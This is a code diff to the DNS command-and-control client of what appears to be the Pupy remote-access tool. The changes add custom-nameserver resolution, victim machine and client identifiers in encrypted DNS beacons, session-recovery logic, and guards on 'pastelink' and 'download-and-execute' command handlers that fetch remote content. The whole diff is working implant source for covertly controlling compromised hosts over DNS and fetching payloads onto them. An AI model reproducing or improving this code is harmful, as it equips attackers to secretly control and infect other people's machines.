@@ -10,44 +10,74 @@ import socket
 import base64
 import hashlib
 import os
-import random
 import sys
 import zlib
 import logging
 import time
+import uuid
 
 from threading import Thread, Lock
 
 import ascii85
 
+try:
+    import dnslib
+except ImportError:
+    logger.info('dnslib not available')
+    dnslib = None
+
+from Crypto.Random import get_random_bytes
+
 from ecpv import ECPV
 from picocmd import *
 
-from network.lib import tinyhttp
+try:
+    from network.lib import tinyhttp
+except ImportError:
+    tinyhttp = None
 
 class DnsCommandClientDecodingError(Exception):
     pass
 
-if __debug__:
-    __DEBUG = 0
-
-    if __DEBUG:
-        import dns.resolver
-        resolver = dns.resolver.Resolver()
-        resolver.nameservers = [ '127.0.0.1' ]
-        resolver.port = 5454
-        socket.gethostbyname_ex = lambda x: (None, None, [
-            str(rdata) for rdata in resolver.query(x, 'A')
-        ])
-
 class DnsCommandsClient(Thread):
-    def __init__(self, domain, key):
+    def __init__(self, domain, key, ns=None, qtype='A', ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
         try:
             import pupy
             self.pupy = pupy
+            self.cid = pupy.cid
         except:
             self.pupy = None
+            self.cid = 31337
 
+        if ns and dnslib:
+            if not type(ns) in (list, tuple):
+                ns = ns.split(':')
+                if len(ns) == 1:
+                    ns = (ns[0], 53)
+                elif len(ns) == 2:
+                    ns = ns[0], int(ns[1])
+                else:
+                    raise ValueError('Invalid NS address: {}'.format(ns))
+
+            self.ns = ns
+            self.ns_proto = ns_proto
+            self.ns_socket = None
+            self.ns_timeout = ns_timeout
+            self.ns_socket_lock = Lock()
+            self.qtype = qtype
+            self.resolve = self._dnslib_resolve
+        else:
+            if ns:
+                logging.error('dnslib not available, use system resolver')
+
+            self.ns = None
+            self.ns_socket = None
+            self.qtype = None
+            self.ns_timeout = None
+            self.resolve = self._native_resolve
+
+        self.node = uuid.getnode()
+        self.nonce = from_bytes(get_random_bytes(4))
         self.domains = domain.split(',')
         self.domain_id = 0
         self.domain = self.domains[self.domain_id]
@@ -62,10 +92,10 @@ class DnsCommandsClient(Thread):
                 '-',
                 ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
             ])))
+
         self.encoder = ECPV(public_key=key)
         self.spi = None
         self.kex = None
-        self.nonce = random.randrange(0, 1<<32-1)
         self.poll = 60
         self.active = True
         self.failed = 0
@@ -82,6 +112,54 @@ class DnsCommandsClient(Thread):
     def event(self, command):
         logging.debug('Event: {}'.format(command))
         self._request(command)
+
+    def _native_resolve(self, hostname):
+        _, _, addresses = socket.gethostbyname_ex(hostname)
+        return addresses
+
+    def _dnslib_resolve(self, hostname):
+        q = dnslib.DNSRecord.question(hostname, self.qtype)
+        r = None
+
+        try:
+            if self.ns_socket:
+                with self.ns_socket_lock:
+                    self.ns_socket.send(q.pack())
+                    r = self.ns_socket.recv(65535)
+            else:
+                s = socket.socket(socket.AF_INET, self.ns_proto)
+                try:
+                    s.connect(self.ns)
+                    s.settimeout(self.ns_timeout)
+                    s.send(q.pack())
+                    r = s.recv(65535)
+                finally:
+                    with self.ns_socket_lock:
+                        if self.ns_proto == socket.SOCK_DGRAM and not self.ns_socket:
+                            self.ns_socket = s
+                        else:
+                            s.close()
+
+        except socket.error, e:
+            logging.info('NS Request exception: {} (ns={})'.format(e, self.ns))
+            self.ns_socket = None
+
+        if not r:
+            return []
+
+        parsed = dnslib.DNSRecord.parse(r)
+        if parsed.header.rcode != dnslib.RCODE.NOERROR:
+            return []
+
+        result = []
+
+        for record in parsed.rr:
+            if not dnslib.QTYPE[record.rclass] == self.qtype:
+                continue
+
+            result.append(str(record.rdata))
+
+        return result
 
     def _a_page_decoder(self, addresses, nonce, symmetric=None):
         if symmetric is None:
@@ -115,18 +193,28 @@ class DnsCommandsClient(Thread):
         if len(data) > 35:
             raise ValueError('Too big page size')
 
+        version = 2
+
         nonce = self.nonce
+        node_block = struct.pack('>BQ', version, self.cid) + to_bytes(self.node, 6)
+
+        payload = self.encoder.encode(data + node_block, nonce, symmetric=True)
+        payload_len = len(payload)
+
+        len_node_block = payload_len - len(data)
+        payload, node_block = payload[:len_node_block], payload[len_node_block:]
+
         encoded = '.'.join([
             ''.join([
                 self.translation[x] for x in base64.b32encode(part)
             ]) for part in [
                 struct.pack('>I', self.spi) if self.spi else None,
-                struct.pack('>I', nonce),
-                self.encoder.encode(data, nonce, symmetric=True)
+                struct.pack('>I', nonce) + node_block,
+                payload
             ] if part is not None
         ]) + '.' + self.domain
 
-        self.nonce += len(encoded)
+        self.nonce += payload_len
         return encoded, nonce
 
     def _request(self, *commands):
@@ -135,10 +223,11 @@ class DnsCommandsClient(Thread):
 
     def _request_unsafe(self, commands):
         parcel = Parcel(*commands)
-        page, nonce = self._q_page_encoder(parcel.pack())
+        page, nonce = self._q_page_encoder(
+            parcel.pack(self.nonce, self.encoder.gen_csum))
 
         try:
-            _, _, addresses = socket.gethostbyname_ex(page)
+            addresses = self.resolve(page)
             if len(addresses) < 2:
                 logging.warning('DNSCNC: short answer: {}'.format(addresses))
                 return []
@@ -152,7 +241,9 @@ class DnsCommandsClient(Thread):
 
         try:
             response = Parcel.unpack(
-                self._a_page_decoder(addresses, nonce)
+                self._a_page_decoder(addresses, nonce),
+                nonce,
+                self.encoder.check_csum
             )
 
             self.failed = 0
@@ -160,13 +251,15 @@ class DnsCommandsClient(Thread):
             logging.error('CRC FAILED / Fallback to Public-key decoding')
 
             try:
-                response = Parcel.unpack(
-                    self._a_page_decoder(addresses, nonce, False)
-                )
-
                 self.spi = None
                 self.encoder.kex_reset()
                 self.on_session_lost()
+
+                response = Parcel.unpack(
+                    self._a_page_decoder(addresses, nonce, False),
+                    nonce,
+                    self.encoder.check_csum
+                )
 
             except ParcelInvalidCrc:
                 logging.error(
@@ -177,6 +270,7 @@ class DnsCommandsClient(Thread):
                 self.failed += 1
                 if self.failed > 5:
                     self.next()
+
                 return []
 
             except ParcelInvalidPayload:
@@ -193,6 +287,10 @@ class DnsCommandsClient(Thread):
         return response.commands
 
     def on_pastelink(self, url, action, encoder):
+        if not tinyhttp:
+            logging.error('TinyHTTP is not available')
+            return
+
         http = tinyhttp.HTTP(proxy=self.proxy, follow_redirects=True)
         content, code = http.get(url, code=True)
         if code == 200:
@@ -212,6 +310,10 @@ class DnsCommandsClient(Thread):
                 logging.exception(e)
 
     def on_downloadexec(self, url, action, use_proxy):
+        if not tinyhttp:
+            logging.error('TinyHTTP is not available')
+            return
+
         try:
             http = tinyhttp.HTTP(
                 proxy=self.proxy if use_proxy else False,
